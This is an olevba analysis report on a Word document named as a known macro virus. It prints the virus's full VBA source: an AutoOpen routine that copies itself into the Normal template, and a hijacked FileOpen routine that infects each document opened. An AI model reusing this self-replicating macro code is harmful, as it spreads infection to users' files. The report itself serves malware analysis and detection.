olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Intended.Stealph
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Intended.Stealph - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Intended.Stealph - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim c
Dim i
 On Error GoTo -1: On Error GoTo ops
 c = 0
 For i = 1 To WordBasic.CountMacros(0, 0)
  If WordBasic.[MacroName$](i, 0, 0) = "CS" Then c = 10
 Next i
 If c = 10 Then GoTo ops
 Rem WinWord 6.0 Infector by CyberShadow...
 Rem Thanks to SGWW !
 WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoOpen", "Normal:CS"
 WordBasic.MacroCopy WordBasic.[FileName$]() + ":CSF", "Normal:FileOpen"
ops:
End Sub
-------------------------------------------------------------------------------
VBA MACRO CSF.bas 
in file: Virus.MSWord.Intended.Stealph - OLE stream: 'Macros/VBA/CSF'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Îòêðûòèå ñóùåñòâóþùåãî äîêóìåíòà èëè øàáëîíà"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.CSF.MAIN"
Dim s
Dim i
 Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileOpen(False)
 On Error GoTo -1: On Error GoTo ops
 WordBasic.CurValues.FileOpen dlg
 WordBasic.Dialog.FileOpen dlg
 WordBasic.FileOpen dlg
 s = 100
 For i = 1 To WordBasic.CountMacros(1, 0, 0)
  If WordBasic.[MacroName$](i, 1) = "CSF" Then s = 1
 Next i
 If s = 1 Then GoTo ops
 Rem WinWord 6.0 Infector by CyberShadow...
 Rem Thanks to SGWW !
 WordBasic.FileSaveAs WordBasic.[FileName$](), Format:=1
 WordBasic.MacroCopy "Normal:CS", WordBasic.[FileName$]() + ":AutoOpen"
 WordBasic.MacroCopy "Normal:FileOpen", WordBasic.[FileName$]() + ":CSF"
ops:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

